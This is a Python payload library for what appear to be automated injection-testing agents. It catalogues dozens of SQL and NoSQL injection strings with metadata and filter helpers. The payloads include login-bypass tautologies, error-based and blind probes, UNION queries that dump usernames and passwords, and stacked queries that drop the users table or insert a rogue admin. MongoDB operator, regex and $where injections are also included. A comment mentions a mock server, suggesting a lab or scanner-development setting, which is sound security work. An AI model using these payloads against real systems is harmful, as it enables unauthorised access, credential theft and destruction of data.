"""
payload_library.py — All SQLi and NoSQLi payloads for both agents.

HOW THIS IS ORGANISED:
  Each payload category is a list of dicts. Every payload dict has:

    {
        "value":       the actual injection string,
        "category":    broad type  (e.g. "sqli", "nosqli"),
        "technique":   specific technique (e.g. "auth_bypass", "union"),
        "description": what this payload is trying to do,
        "detect_in":   where to look for success ("error", "data",
                       "timing", "auth", "content_change")
    }

WHY DICTS INSTEAD OF PLAIN STRINGS?
  The response analyser needs to know WHAT it is looking for after
  each payload fires. A plain string payload gives no context.
  Attaching technique and detect_in means the analyser can apply
  the right detection logic per payload automatically.
"""


# ═══════════════════════════════════════════════════════════════
# SQL INJECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════

# ── 1. Classic / Auth Bypass ────────────────────────────────────
# These work when user input is directly concatenated into a WHERE
# clause. The goal is to make the condition always true or to
# comment out the rest of the query entirely.
SQLI_AUTH_BYPASS = [
    {
        "value":       "' OR '1'='1",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "Classic OR tautology — makes WHERE always true",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       "' OR '1'='1'--",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "Tautology with comment to drop password check",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       "' OR 1=1--",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "Numeric tautology with comment",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       "admin'--",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "Username with comment — drops password clause",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       "admin' #",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "MySQL-style hash comment",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       "' OR 'x'='x",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "String equality tautology",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       "') OR ('1'='1",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "Tautology with parenthesis balancing",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       "' OR 1=1 LIMIT 1--",
        "category":    "sqli",
        "technique":   "auth_bypass",
        "description": "Tautology with LIMIT to return exactly one row",
        "detect_in":   ["auth", "data"],
    },
]


# ── 2. Error-Based ──────────────────────────────────────────────
# Force the database to throw an error that leaks information about
# its internal structure — table names, column names, DB version.
# The error message itself is the vulnerability signal.
SQLI_ERROR_BASED = [
    {
        "value":       "'",
        "category":    "sqli",
        "technique":   "error_based",
        "description": "Single quote — breaks string context, triggers syntax error",
        "detect_in":   ["error"],
    },
    {
        "value":       "''",
        "category":    "sqli",
        "technique":   "error_based",
        "description": "Double single quote — tests escaping behaviour",
        "detect_in":   ["error"],
    },
    {
        "value":       "1'",
        "category":    "sqli",
        "technique":   "error_based",
        "description": "Numeric field with trailing quote",
        "detect_in":   ["error"],
    },
    {
        "value":       "1 AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
        "category":    "sqli",
        "technique":   "error_based",
        "description": "MSSQL error-based table name extraction",
        "detect_in":   ["error"],
    },
    {
        "value":       "1 AND extractvalue(1,concat(0x7e,(SELECT version())))--",
        "category":    "sqli",
        "technique":   "error_based",
        "description": "MySQL extractvalue() — leaks DB version in error",
        "detect_in":   ["error"],
    },
    {
        "value":       "1 AND (SELECT 1 FROM(SELECT COUNT(*),concat((SELECT database()),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "category":    "sqli",
        "technique":   "error_based",
        "description": "MySQL GROUP BY error — leaks database name",
        "detect_in":   ["error"],
    },
    {
        "value":       "' AND 1=cast((SELECT version()) as int)--",
        "category":    "sqli",
        "technique":   "error_based",
        "description": "PostgreSQL cast error — leaks version string",
        "detect_in":   ["error"],
    },
]


# ── 3. Boolean Blind ────────────────────────────────────────────
# When the application returns no error but behaves differently
# based on a true/false condition, we can extract data bit by bit.
# True condition → normal response. False condition → empty/different.
SQLI_BOOLEAN_BLIND = [
    {
        "value":       "1 AND 1=1",
        "category":    "sqli",
        "technique":   "boolean_blind",
        "description": "True condition — baseline normal response",
        "detect_in":   ["content_change"],
    },
    {
        "value":       "1 AND 1=2",
        "category":    "sqli",
        "technique":   "boolean_blind",
        "description": "False condition — response should differ from 1 AND 1=1",
        "detect_in":   ["content_change"],
    },
    {
        "value":       "1 AND (SELECT COUNT(*) FROM users)>0",
        "category":    "sqli",
        "technique":   "boolean_blind",
        "description": "Confirms 'users' table exists",
        "detect_in":   ["content_change"],
    },
    {
        "value":       "1 AND (SELECT COUNT(*) FROM sqlite_master)>0",
        "category":    "sqli",
        "technique":   "boolean_blind",
        "description": "Confirms SQLite backend (sqlite_master exists)",
        "detect_in":   ["content_change"],
    },
    {
        "value":       "1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'",
        "category":    "sqli",
        "technique":   "boolean_blind",
        "description": "Character extraction — checks if first username starts with 'a'",
        "detect_in":   ["content_change"],
    },
    {
        "value":       "1 AND (SELECT 1 FROM users WHERE username='admin')=1",
        "category":    "sqli",
        "technique":   "boolean_blind",
        "description": "Confirms admin user exists in users table",
        "detect_in":   ["content_change"],
    },
    {
        "value":       "1 AND LENGTH((SELECT password FROM users WHERE username='admin'))>5",
        "category":    "sqli",
        "technique":   "boolean_blind",
        "description": "Checks if admin password length is greater than 5",
        "detect_in":   ["content_change"],
    },
]


# ── 4. Time-Based Blind ─────────────────────────────────────────
# When the app returns identical responses regardless of condition,
# we use time delays to extract information. If the DB sleeps, the
# injection succeeded. Timing difference IS the signal.
SQLI_TIME_BASED = [
    {
        "value":       "1; SELECT SLEEP(3)--",
        "category":    "sqli",
        "technique":   "time_based",
        "description": "MySQL SLEEP — 3 second delay if vulnerable",
        "detect_in":   ["timing"],
    },
    {
        "value":       "1 AND SLEEP(3)--",
        "category":    "sqli",
        "technique":   "time_based",
        "description": "MySQL SLEEP in AND clause",
        "detect_in":   ["timing"],
    },
    {
        "value":       "'; WAITFOR DELAY '0:0:3'--",
        "category":    "sqli",
        "technique":   "time_based",
        "description": "MSSQL WAITFOR DELAY — 3 second delay",
        "detect_in":   ["timing"],
    },
    {
        "value":       "1; SELECT pg_sleep(3)--",
        "category":    "sqli",
        "technique":   "time_based",
        "description": "PostgreSQL pg_sleep — 3 second delay",
        "detect_in":   ["timing"],
    },
    {
        "value":       "1 AND (SELECT COUNT(*) FROM sqlite_master WHERE randomblob(300000000))>0",
        "category":    "sqli",
        "technique":   "time_based",
        "description": "SQLite time delay via randomblob — CPU-bound delay",
        "detect_in":   ["timing"],
    },
    {
        "value":       "' AND SLEEP(3) AND '1'='1",
        "category":    "sqli",
        "technique":   "time_based",
        "description": "MySQL SLEEP inside string context",
        "detect_in":   ["timing"],
    },
]


# ── 5. UNION-Based ──────────────────────────────────────────────
# Append a second SELECT to the original query using UNION.
# The second SELECT fetches data from OTHER tables (e.g. users)
# and it appears in the response as if it were normal data.
# Requires knowing (or guessing) the number of columns first.
SQLI_UNION = [
    {
        "value":       "' UNION SELECT NULL--",
        "category":    "sqli",
        "technique":   "union",
        "description": "1-column UNION probe — finds correct column count",
        "detect_in":   ["data", "error"],
    },
    {
        "value":       "' UNION SELECT NULL,NULL--",
        "category":    "sqli",
        "technique":   "union",
        "description": "2-column UNION probe",
        "detect_in":   ["data", "error"],
    },
    {
        "value":       "' UNION SELECT NULL,NULL,NULL--",
        "category":    "sqli",
        "technique":   "union",
        "description": "3-column UNION probe",
        "detect_in":   ["data", "error"],
    },
    {
        "value":       "' UNION SELECT NULL,NULL,NULL,NULL--",
        "category":    "sqli",
        "technique":   "union",
        "description": "4-column UNION probe — matches products table width",
        "detect_in":   ["data", "error"],
    },
    {
        "value":       "' UNION SELECT id,username,password,email FROM users--",
        "category":    "sqli",
        "technique":   "union",
        "description": "Full user table dump via UNION",
        "detect_in":   ["data"],
    },
    {
        "value":       "' UNION SELECT 1,username,password,email FROM users WHERE role='admin'--",
        "category":    "sqli",
        "technique":   "union",
        "description": "Admin credentials extraction via UNION",
        "detect_in":   ["data"],
    },
    {
        "value":       "' UNION SELECT 1,name,sql,4 FROM sqlite_master--",
        "category":    "sqli",
        "technique":   "union",
        "description": "SQLite schema extraction — leaks CREATE TABLE statements",
        "detect_in":   ["data"],
    },
    {
        "value":       "' UNION SELECT 1,2,3,group_concat(username,':',password) FROM users--",
        "category":    "sqli",
        "technique":   "union",
        "description": "All credentials as a single concatenated string",
        "detect_in":   ["data"],
    },
]


# ── 6. Stacked Queries ──────────────────────────────────────────
# Inject a second complete SQL statement using a semicolon.
# Only works on databases/drivers that allow multiple statements.
SQLI_STACKED = [
    {
        "value":       "1; DROP TABLE users--",
        "category":    "sqli",
        "technique":   "stacked",
        "description": "Destructive stacked query — drops users table (probe only)",
        "detect_in":   ["error", "content_change"],
    },
    {
        "value":       "1; INSERT INTO users VALUES(99,'hacked','hacked','h@h.com','admin')--",
        "category":    "sqli",
        "technique":   "stacked",
        "description": "Stacked INSERT — creates a rogue admin account",
        "detect_in":   ["content_change"],
    },
    {
        "value":       "1; UPDATE users SET role='admin' WHERE username='alice'--",
        "category":    "sqli",
        "technique":   "stacked",
        "description": "Stacked UPDATE — privilege escalation",
        "detect_in":   ["content_change"],
    },
]


# ═══════════════════════════════════════════════════════════════
# NOSQL INJECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════

# ── 7. Operator Injection ───────────────────────────────────────
# MongoDB accepts operators ($ne, $gt, $regex etc.) as query values.
# If the app passes the request body directly to the DB query,
# an attacker can CONTROL the operator, not just the value.
NOSQLI_OPERATOR = [
    {
        "value":       {"$ne": ""},
        "category":    "nosqli",
        "technique":   "operator_injection",
        "description": "$ne '' — not-equal always true for non-empty fields",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       {"$gt": ""},
        "category":    "nosqli",
        "technique":   "operator_injection",
        "description": "$gt '' — greater-than always true for non-empty strings",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       {"$gte": ""},
        "category":    "nosqli",
        "technique":   "operator_injection",
        "description": "$gte '' — greater-than-or-equal, always true",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       {"$lt": "zzzzz"},
        "category":    "nosqli",
        "technique":   "operator_injection",
        "description": "$lt 'zzzzz' — less-than, true for most strings",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       {"$exists": True},
        "category":    "nosqli",
        "technique":   "operator_injection",
        "description": "$exists true — matches any doc where field exists",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       {"$ne": None},
        "category":    "nosqli",
        "technique":   "operator_injection",
        "description": "$ne null — matches all non-null field values",
        "detect_in":   ["auth", "data"],
    },
]


# ── 8. Auth Bypass ──────────────────────────────────────────────
# Combinations of operators designed specifically to bypass
# username + password authentication in NoSQL databases.
NOSQLI_AUTH_BYPASS = [
    {
        "value":       {"username": {"$gt": ""}, "password": {"$gt": ""}},
        "category":    "nosqli",
        "technique":   "auth_bypass",
        "description": "Both fields $gt — returns first document regardless of values",
        "detect_in":   ["auth"],
    },
    {
        "value":       {"username": {"$ne": ""}, "password": {"$ne": ""}},
        "category":    "nosqli",
        "technique":   "auth_bypass",
        "description": "Both fields $ne — matches first non-empty user",
        "detect_in":   ["auth"],
    },
    {
        "value":       {"username": "admin", "password": {"$ne": "wrongpassword"}},
        "category":    "nosqli",
        "technique":   "auth_bypass",
        "description": "Admin with $ne on password — bypasses password check",
        "detect_in":   ["auth"],
    },
    {
        "value":       {"username": "admin", "password": {"$gt": ""}},
        "category":    "nosqli",
        "technique":   "auth_bypass",
        "description": "Admin with $gt on password — always true",
        "detect_in":   ["auth"],
    },
    {
        "value":       {"username": {"$regex": "admin"}, "password": {"$ne": ""}},
        "category":    "nosqli",
        "technique":   "auth_bypass",
        "description": "Regex on username + $ne on password",
        "detect_in":   ["auth"],
    },
]


# ── 9. Regex Injection ──────────────────────────────────────────
# $regex allows pattern matching. If user input controls the regex
# value, an attacker can match far more documents than intended.
NOSQLI_REGEX = [
    {
        "value":       {"$regex": ".*"},
        "category":    "nosqli",
        "technique":   "regex_injection",
        "description": "$regex .* — matches every document",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$regex": "^admin"},
        "category":    "nosqli",
        "technique":   "regex_injection",
        "description": "$regex ^admin — finds all admin-prefixed usernames",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$regex": ".*", "$options": "i"},
        "category":    "nosqli",
        "technique":   "regex_injection",
        "description": "$regex .* case-insensitive — matches everything",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$regex": "^a"},
        "category":    "nosqli",
        "technique":   "regex_injection",
        "description": "$regex ^a — finds usernames starting with 'a'",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$regex": ".+"},
        "category":    "nosqli",
        "technique":   "regex_injection",
        "description": "$regex .+ — matches any non-empty string",
        "detect_in":   ["data"],
    },
]


# ── 10. $where Injection ────────────────────────────────────────
# $where evaluates a JavaScript expression server-side in MongoDB.
# This is essentially arbitrary code execution on the DB server.
# Our mock server simulates this with Python eval().
NOSQLI_WHERE = [
    {
        "value":       {"$where": "this.role == 'admin'"},
        "category":    "nosqli",
        "technique":   "where_injection",
        "description": "$where JS — returns all admin users",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$where": "this.username != ''"},
        "category":    "nosqli",
        "technique":   "where_injection",
        "description": "$where JS — returns all users with non-empty username",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$where": "this.password.length > 0"},
        "category":    "nosqli",
        "technique":   "where_injection",
        "description": "$where JS — returns users with any password set",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$where": "1 == 1"},
        "category":    "nosqli",
        "technique":   "where_injection",
        "description": "$where tautology — always true, returns all documents",
        "detect_in":   ["data"],
    },
    {
        "value":       {"$where": "this.role == 'admin' && this.username == 'admin'"},
        "category":    "nosqli",
        "technique":   "where_injection",
        "description": "$where compound condition — finds specific admin account",
        "detect_in":   ["data"],
    },
]


# ── 11. Array / Type Abuse ──────────────────────────────────────
# Some NoSQL databases behave unexpectedly when a field that expects
# a string receives an array or object. This can bypass validation.
NOSQLI_ARRAY_ABUSE = [
    {
        "value":       ["admin", {"$ne": ""}],
        "category":    "nosqli",
        "technique":   "array_abuse",
        "description": "Array with operator — some drivers match any element",
        "detect_in":   ["auth", "data", "error"],
    },
    {
        "value":       {"$in": ["admin", "administrator", "root"]},
        "category":    "nosqli",
        "technique":   "array_abuse",
        "description": "$in operator — matches any of the listed values",
        "detect_in":   ["auth", "data"],
    },
    {
        "value":       {"$nin": [""]},
        "category":    "nosqli",
        "technique":   "array_abuse",
        "description": "$nin — not-in empty list, matches everything",
        "detect_in":   ["data"],
    },
]


# ═══════════════════════════════════════════════════════════════
# AGGREGATED COLLECTIONS
# ═══════════════════════════════════════════════════════════════

ALL_SQLI_PAYLOADS = (
    SQLI_AUTH_BYPASS +
    SQLI_ERROR_BASED +
    SQLI_BOOLEAN_BLIND +
    SQLI_TIME_BASED +
    SQLI_UNION +
    SQLI_STACKED
)

ALL_NOSQLI_PAYLOADS = (
    NOSQLI_OPERATOR +
    NOSQLI_AUTH_BYPASS +
    NOSQLI_REGEX +
    NOSQLI_WHERE +
    NOSQLI_ARRAY_ABUSE
)


# ─────────────────────────────────────────────────────────────
# Lookup helpers used by the agents
# ─────────────────────────────────────────────────────────────

def get_sqli_payloads(techniques: list[str] | None = None) -> list[dict]:
    """
    Return SQLi payloads, optionally filtered by technique name(s).

    Available techniques:
      auth_bypass · error_based · boolean_blind · time_based · union · stacked

    Example:
      get_sqli_payloads(["auth_bypass", "union"])
    """
    if not techniques:
        return ALL_SQLI_PAYLOADS
    return [p for p in ALL_SQLI_PAYLOADS if p["technique"] in techniques]


def get_nosqli_payloads(techniques: list[str] | None = None) -> list[dict]:
    """
    Return NoSQLi payloads, optionally filtered by technique name(s).

    Available techniques:
      operator_injection · auth_bypass · regex_injection · where_injection · array_abuse

    Example:
      get_nosqli_payloads(["operator_injection", "auth_bypass"])
    """
    if not techniques:
        return ALL_NOSQLI_PAYLOADS
    return [p for p in ALL_NOSQLI_PAYLOADS if p["technique"] in techniques]


def get_payloads_by_detect_in(category: str, signal: str) -> list[dict]:
    """
    Return all payloads of a given category that target a specific signal.

    Example:
      get_payloads_by_detect_in("sqli", "timing")
      → all time-based SQLi payloads
    """
    source = ALL_SQLI_PAYLOADS if category == "sqli" else ALL_NOSQLI_PAYLOADS
    return [p for p in source if signal in p["detect_in"]]


# ─────────────────────────────────────────────────────────────
# Quick self-test  (python -m tools.payload_library)
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("\n" + "═" * 60)
    print("  PAYLOAD LIBRARY — SUMMARY")
    print("═" * 60)

    sqli_by_technique = {}
    for p in ALL_SQLI_PAYLOADS:
        sqli_by_technique.setdefault(p["technique"], []).append(p)

    nosqli_by_technique = {}
    for p in ALL_NOSQLI_PAYLOADS:
        nosqli_by_technique.setdefault(p["technique"], []).append(p)

    print(f"\n  SQLi Payloads — Total: {len(ALL_SQLI_PAYLOADS)}")
    for tech, payloads in sqli_by_technique.items():
        print(f"    {tech:<20} {len(payloads)} payloads")

    print(f"\n  NoSQLi Payloads — Total: {len(ALL_NOSQLI_PAYLOADS)}")
    for tech, payloads in nosqli_by_technique.items():
        print(f"    {tech:<20} {len(payloads)} payloads")

    print("\n" + "─" * 60)
    print("  Filter test — get_sqli_payloads(['union'])")
    union = get_sqli_payloads(["union"])
    for p in union:
        print(f"    → {p['value'][:60]}")

    print("\n  Filter test — get_payloads_by_detect_in('sqli', 'timing')")
    timed = get_payloads_by_detect_in("sqli", "timing")
    for p in timed:
        print(f"    → {p['value'][:60]}")

    print("\n  Filter test — get_nosqli_payloads(['where_injection'])")
    where = get_nosqli_payloads(["where_injection"])
    for p in where:
        print(f"    → {p['value']}")

    print("\n" + "═" * 60)
    print(f"  ✅ Payload library loaded successfully")
    print("═" * 60 + "\n")